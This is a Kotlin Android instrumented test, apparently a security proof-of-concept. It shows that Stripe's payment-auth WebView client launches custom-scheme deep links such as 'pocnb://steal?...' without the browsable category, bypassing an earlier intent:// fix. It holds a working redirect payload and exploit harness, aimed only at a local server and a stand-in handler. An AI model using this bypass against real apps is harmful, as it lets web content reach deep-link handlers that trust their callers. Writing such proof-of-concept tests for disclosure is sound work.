package com.stripe.android.view

import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Intent
import android.webkit.WebView
import androidx.test.core.app.ActivityScenario
import androidx.test.ext.junit.runners.AndroidJUnit4
import com.google.common.truth.Truth.assertThat
import com.google.common.truth.Truth.assertWithMessage
import com.stripe.android.TestActivity
import com.stripe.android.core.Logger
import java.io.Closeable
import java.net.InetAddress
import java.net.ServerSocket
import java.util.Collections
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.flow.MutableStateFlow
import org.junit.After
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith

/**
 * Real-WebView + real-intent-resolution PoC for the fix-gap in commit
 * 1be3556 ("Sanitize payment authentication intent URLs", PR #14843).
 *
 * A page loaded in the payment-auth WebView navigates to a custom-scheme
 * deep link. The production [PaymentAuthWebViewClient] launches it via a
 * bare implicit ACTION_VIEW (no CATEGORY_BROWSABLE, no scheme allowlist).
 * The target is [NonBrowsablePoCReceiverActivity], registered in the test
 * manifest with the `pocnb` scheme but deliberately WITHOUT the browsable
 * category - modelling a deep-link handler that opted out of browser
 * launches because it assumes launch-time trust.
 *
 * Two scenarios on a real emulator:
 *   1. pocnb://...        -> the NON-browsable handler IS launched
 *      (the unfixed custom-scheme branch).
 *   2. intent://...#Intent;scheme=pocnb;end
 *                        -> the SAME handler is NOT reachable, because
 *      commit 1be3556 forces CATEGORY_BROWSABLE on that branch. The
 *      differential proves the fix's own security property, and that the
 *      sibling branch bypasses it.
 *
 * Pinned analysis commit: 9ba4c822 (stripe-android master, 2026-10-23).
 */
@RunWith(AndroidJUnit4::class)
internal class PaymentAuthWebViewSchemeFixGapRealWebViewPoCTest {

    private lateinit var server: MiniServer
    private val onAuthCompletedErrors = Collections.synchronizedList(mutableListOf<Throwable>())

    @Before
    fun setUp() {
        NonBrowsablePoCReceiverActivity.reset()
        onAuthCompletedErrors.clear()
    }

    @After
    fun tearDown() {
        runCatching { server.close() }
    }

    @Test
    fun realWebViewPageNavigation_customSchemeLaunchesNonBrowsableHandler() {
        server = MiniServer { method, _, _ ->
            if (method == "GET") {
                200 to buildRedirectHtml("pocnb://steal?d=from_auth_webview")
            } else {
                404 to "not found"
            }
        }
        val pageUrl = "http://127.0.0.1:${server.port}/"

        ActivityScenario.launch(TestActivity::class.java).use { scenario ->
            scenario.onActivity { activity ->
                installProductionClient(activity, pageUrl)
            }

            val hit = NonBrowsablePoCReceiverActivity.awaitHit(timeoutSeconds = 45)
            val diagnostics = buildDiagnostics(pageUrl)
            println("[PoC-DIAG] $diagnostics")

            assertWithMessage("non-browsable handler was never launched - $diagnostics")
                .that(hit)
                .isNotNull()

            // The handler received the attacker-controlled deep link, and the
            // launching intent carried NO browsable category.
            assertThat(hit!!.first).isEqualTo("pocnb://steal?d=from_auth_webview")
            assertThat(hit.second).doesNotContain(Intent.CATEGORY_BROWSABLE)

            // Handoff treated as success: no auth failure surfaced.
            assertWithMessage("auth completed with error - $diagnostics")
                .that(onAuthCompletedErrors)
                .isEmpty()

            println("[PoC] PASS: custom-scheme navigation launched a NON-browsable deep-link handler")
        }
    }

    @Test
    fun realWebViewPageNavigation_intentSchemeEquivalent_isBlockedFromNonBrowsableHandler() {
        server = MiniServer { method, _, _ ->
            if (method == "GET") {
                200 to buildRedirectHtml(
                    "intent://steal?d=from_auth_webview#Intent;scheme=pocnb;end",
                )
            } else {
                404 to "not found"
            }
        }
        val pageUrl = "http://127.0.0.1:${server.port}/"

        ActivityScenario.launch(TestActivity::class.java).use { scenario ->
            var authErrorLatch: CountDownLatch? = null
            scenario.onActivity { activity ->
                authErrorLatch = installProductionClient(activity, pageUrl)
            }

            val errorSurfaced = authErrorLatch?.await(45, TimeUnit.SECONDS) ?: false
            val hit = NonBrowsablePoCReceiverActivity.currentHit()
            val diagnostics = buildDiagnostics(pageUrl)
            println("[PoC-DIAG] $diagnostics")

            // Fix behavior on the intent:// branch: CATEGORY_BROWSABLE is
            // added, so the non-browsable-only handler no longer matches.
            // startActivity throws ActivityNotFoundException, which the
            // client surfaces as an auth-completion error.
            assertWithMessage("non-browsable handler must NOT be launched via intent:// - $diagnostics")
                .that(hit)
                .isNull()
            assertWithMessage("expected ActivityNotFoundException - $diagnostics")
                .that(errorSurfaced)
                .isTrue()
            assertThat(onAuthCompletedErrors).hasSize(1)
            assertThat(onAuthCompletedErrors.first()).isInstanceOf(ActivityNotFoundException::class.java)

            println("[PoC] PASS: intent:// branch (fixed) cannot reach the non-browsable handler")
        }
    }

    /**
     * Installs the PRODUCTION [PaymentAuthWebViewClient] on a real WebView,
     * with activityStarter wired to a real system startActivity() so intent
     * resolution runs against the emulator's package manager. Returns a
     * latch that counts down when onAuthCompleted delivers an error.
     */
    private fun installProductionClient(activity: Activity, pageUrl: String): CountDownLatch {
        val errorLatch = CountDownLatch(1)
        val isPageLoaded = MutableStateFlow(false)
        val webView = WebView(activity)
        val client = PaymentAuthWebViewClient(
            Logger.getInstance(enableLogging = false),
            isPageLoaded,
            "pi_123_secret_456",
            null,
            { intent -> activity.startActivity(intent) },
        ) { error ->
            error?.let(onAuthCompletedErrors::add)
            errorLatch.countDown()
        }
        webView.webViewClient = client
        activity.setContentView(webView)
        webView.loadUrl(pageUrl)
        return errorLatch
    }

    private fun buildDiagnostics(pageUrl: String): String = buildString {
        append("pageUrl=").append(pageUrl)
        append(" | serverHits=").append(server.requestLog())
        append(" | receiverHit=").append(NonBrowsablePoCReceiverActivity.currentHit())
        append(" | authErrors=").append(onAuthCompletedErrors.map { it.javaClass.simpleName })
    }

    private fun buildRedirectHtml(target: String): String = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>auth-redirect-page</title></head>
        <body><script>location.href = "$target";</script></body></html>
    """.trimIndent()

    private class MiniServer(
        private val handler: (method: String, path: String, body: String?) -> Pair<Int, String>,
    ) : Closeable {
        private val socket = ServerSocket(0, 50, InetAddress.getByName("127.0.0.1"))
        val port: Int get() = socket.localPort
        private val log = Collections.synchronizedList(mutableListOf<String>())

        fun requestLog(): List<String> = synchronized(log) { log.toList() }

        private val thread = Thread {
            while (!socket.isClosed) {
                runCatching {
                    socket.accept().use { client ->
                        // Read the request manually from the raw stream: a
                        // BufferedReader would swallow a POST body into its
                        // buffer, deadlocking body reads on the raw stream.
                        val raw = client.getInputStream()
                        val requestLine = readLine(raw) ?: return@use
                        val parts = requestLine.split(" ")
                        val method = parts.getOrElse(0) { "GET" }
                        val path = parts.getOrNull(1)?.substringBefore("?") ?: "/"
                        log.add("$method $path")
                        var contentLength = 0
                        while (true) {
                            val line = readLine(raw) ?: break
                            if (line.isEmpty()) break
                            if (line.startsWith("Content-Length:", ignoreCase = true)) {
                                contentLength = line.substringAfter(":").trim().toIntOrNull() ?: 0
                            }
                        }
                        val body = if (contentLength > 0) {
                            val bytes = ByteArray(contentLength)
                            var read = 0
                            while (read < contentLength) {
                                val n = raw.read(bytes, read, contentLength - read)
                                if (n < 0) break
                                read += n
                            }
                            String(bytes, 0, read, Charsets.UTF_8)
                        } else {
                            null
                        }
                        val (code, payload) = handler(method, path, body)
                        val payloadBytes = payload.toByteArray(Charsets.UTF_8)
                        val status = if (code == 200) "OK" else "Not Found"
                        val header = (
                            "HTTP/1.1 $code $status\r\n" +
                                "Content-Type: text/html; charset=utf-8\r\n" +
                                "Content-Length: ${payloadBytes.size}\r\n" +
                                "Connection: close\r\n\r\n"
                            ).toByteArray(Charsets.UTF_8)
                        client.getOutputStream().write(header)
                        client.getOutputStream().write(payloadBytes)
                        client.getOutputStream().flush()
                    }
                }
            }
        }.apply {
            isDaemon = true
            start()
        }

        private fun readLine(raw: java.io.InputStream): String? {
            val sb = StringBuilder()
            while (true) {
                val b = raw.read()
                if (b == -1) return if (sb.isEmpty()) null else sb.toString()
                if (b == '\n'.code) break
                if (b != '\r'.code) sb.append(b.toChar())
            }
            return sb.toString()
        }

        override fun close() {
            runCatching { socket.close() }
        }
    }
}

/**
 * Stand-in for a real-world deep-link handler that deliberately did NOT
 * declare android.intent.category.BROWSABLE: it only wants launches from
 * its own app / trusted first-party flows, not from web content.
 * Registered in payments-core's androidTest AndroidManifest.xml with the
 * `pocnb` scheme.
 */
class NonBrowsablePoCReceiverActivity : Activity() {
    override fun onCreate(savedInstanceState: android.os.Bundle?) {
        super.onCreate(savedInstanceState)
        val dataString = intent?.dataString ?: "null"
        val categories = intent?.categories?.toList()?.sorted() ?: emptyList()
        // Publish the hit BEFORE releasing the latch so an awaiter can never
        // wake up and observe a still-null hit.
        synchronized(lock) {
            lastHit = dataString to categories
            hitLatch?.countDown()
        }
        finish()
    }

    companion object {
        private val lock = Any()
        private var lastHit: Pair<String, List<String>>? = null
        private var hitLatch: CountDownLatch? = null

        fun reset() {
            synchronized(lock) {
                lastHit = null
                hitLatch = null
            }
        }

        fun currentHit(): Pair<String, List<String>>? = synchronized(lock) { lastHit }

        fun awaitHit(timeoutSeconds: Long): Pair<String, List<String>>? {
            val latch = CountDownLatch(1)
            synchronized(lock) {
                lastHit?.let { return it }
                hitLatch = latch
            }
            latch.await(timeoutSeconds, TimeUnit.SECONDS)
            return currentHit()
        }
    }
}
